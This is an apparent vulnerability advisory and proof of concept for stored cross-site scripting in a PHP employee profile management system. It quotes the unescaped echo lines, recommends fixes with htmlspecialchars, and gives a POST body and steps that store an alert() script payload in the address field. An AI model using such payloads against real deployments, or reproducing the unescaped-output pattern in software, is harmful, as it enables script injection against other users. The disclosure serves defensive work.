# employee-management-XSS
Proof-of-Concept and Advisory for Employee Profile Management System XSS


https://code-projects.org/employee-profile-management-system-in-php-with-source-code/

# Vulnerability Advisory & Exploit

## Affected Version

Employee Profile Management System in PHP

---

## Vulnerability Type

**Stored Cross-Site Scripting (XSS)** in view_personnel.php and print_personnel_report.php

---

## Vulnerability Verification (Code-Level)

In the source code you provided, multiple user-controlled fields from tbl_personnel are rendered directly into HTML without any output encoding:

In *view_personnel.php*:
    
    <LABEL class = "address"><u><?php echo $row['per_address']; ?></u></LABEL>
    ...
    <LABEL class = "address"><u><?php echo $row['dr_school']; ?></u></LABEL>
    <LABEL class = "address"><u><?php echo $row['other_school']; ?></u></LABEL>


In *print_personnel_report.php*:
    
    <label><?php echo $row['per_address']; ?></label>
    ...
    <td><label><?php echo $row['bs_school']; ?></label>
    <td><label><?php echo $row['ms_school']; ?></label>
    <td><label><?php echo $row['dr_school']; ?></label>


These values are populated from **$_POST** without sanitization in **add_personnel_query.php / edit_personnel_query.php**, for example:

    $per_address = $_POST['per_address'];
    ...
    $add_personnel = $con->prepare("UPDATE tbl_personnel SET ... per_address = ? ...");
    $add_personnel->execute(array(..., $per_address, ...));


There is no use of htmlspecialchars() or equivalent output encoding before echoing these fields.
Because an attacker can set fields like per_address, bs_school, ms_school, etc. to HTML/JavaScript, the application is vulnerable to stored XSS when personnel details or reports are viewed or printed.

---

## Advisory (Recommendations)

### Apply HTML output encoding for all user-controlled data
Wrap all echo $row[...] calls in htmlspecialchars, for example:

    echo htmlspecialchars($row['per_address'], ENT_QUOTES, 'UTF-8');


Do this consistently in:
  
  **view_personnel.php**
  
  **print_personnel_report.php**
  
  Any other view that outputs tbl_personnel fields.

### Sanitize and validate input on save/update

  Reject or normalize inputs containing obvious script tags or event attributes (onerror, onload, etc.) for fields that should only contain text (names, addresses, schools, degrees).

  Enforce length and character set constraints for profile fields.

### Adopt a global output-encoding strategy

  Use a centralized helper function for safe output (e.g. e($value) which internally calls htmlspecialchars).

  Ensure templates never directly print raw database content.

## Proof-of-Concept (Exploit)
**POST payload example (stored XSS via Address field)**

Target endpoint (as used by the form):
*POST /Profiling/add_personnel_query.php*

Example POST body (only key fields shown — other required fields can be filled with normal test values):

      per_firstname=Alice
      per_middlename=Test
      per_lastname=User
      per_suffix=
      per_gender=Female
      per_status=Single
      per_address=<script>alert('XSS from per_address');</script>
      per_position=1
      rank_name=1
      per_eligibility=Sample
      dept_id=1
      per_designation=Teacher
      per_date_of_birth=1990-01-01
      per_place_of_birth=TestCity
      per_date_of_original_appointment=2010-01-01
      ...
      save=Save


After submission, this payload is stored in **tbl_personnel.per_address** and later rendered unescaped.

---

## Exploit Steps

### Login
Authenticate as a user who is allowed to add or edit personnel (e.g., an admin or HR staff).

### Create a malicious personnel record

  Navigate to:
**http://<host>/Profiling/add_personnel.php**

  Fill all required fields with normal-looking data.

  Set Address to a JavaScript payload, e.g.:
    
    <script>alert('Stored XSS in Employee Profile');</script>


  Submit the form (this issues the POST to add_personnel_query.php).

### Trigger XSS via personnel report page

  Go to:
**http://<host>/Profiling/individual_report.php**

  Locate the newly created personnel entry and click the “Print” button, which links to:
**print_personnel_report.php?per_id=<NEW_ID>**

  When print_personnel_report.php loads, the stored payload in per_address is rendered as:

      <label><?php echo $row['per_address']; ?></label>


  Because there is no HTML escaping, the browser executes the injected <script>, showing an alert.

### Alternative trigger via personnel view (if used in deployment)

  Directly request:
**http://<host>/Profiling/view_personnel.php?per_id=<NEW_ID>**

  The same per_address (and other fields like bs_school, ms_school, etc.) are printed with:

    <LABEL class = "address"><u><?php echo $row['per_address']; ?></u></LABEL>


  The JavaScript payload executes in the context of the application.
